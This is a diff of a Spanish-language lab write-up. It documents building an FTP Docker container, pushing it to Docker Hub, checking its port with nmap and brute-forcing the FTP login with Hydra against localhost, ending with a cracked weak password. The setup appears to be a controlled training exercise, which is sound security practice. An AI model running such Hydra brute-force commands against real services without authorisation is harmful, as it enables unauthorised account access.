@@ -46,15 +46,17 @@ sudo docker login
 sudo docker tag retoftp jjmartirojas/retoftp:1.0
 sudo docker push jjmartirojas/retoftp:1.0
 ✅ Resultado: Imagen publicada en docker.io/jjmartirojas/retoftp:1.0
-🚀 # 6. Ejecución del contenedor
+
+# 6. Ejecución del contenedor
 
 sudo docker run -d -p 2222:21 --name retoftp jjmartirojas/retoftp:1.0
 sdo docker ps
-🕵️‍♂️ # 7. Verificación del puerto
+# 7. Verificación del puerto
 
 nmap -p 2222 localhost
 ✅ Resultado: Puerto 2222 abierto
-🧪 # 8. Ataque de fuerza bruta con Hydra
+
+# 8. Ataque de fuerza bruta con Hydra
 
 Diccionario
 Archivo diccionario.txt con contraseñas posibles:
@@ -67,6 +69,7 @@ Ejecución del ataque:
 hydra -l DIEGO -P diccionario.txt ftp://localhost:2222 -t 4
 🔓 Resultado exitoso:
 [2222][ftp] host: localhost   login: DIEGO   password: 1234
-✅ # 9. Resultado final
+
+# 9. Resultado final
 
 Se logró acceder al servicio FTP creado en Docker mediante un ataque de fuerza bruta con Hydra. El entorno fue construido desde cero en un ambiente Kali Linux, incluyendo creación de contenedor, configuración de usuario y servicio, y ejecución del ataque controlado.
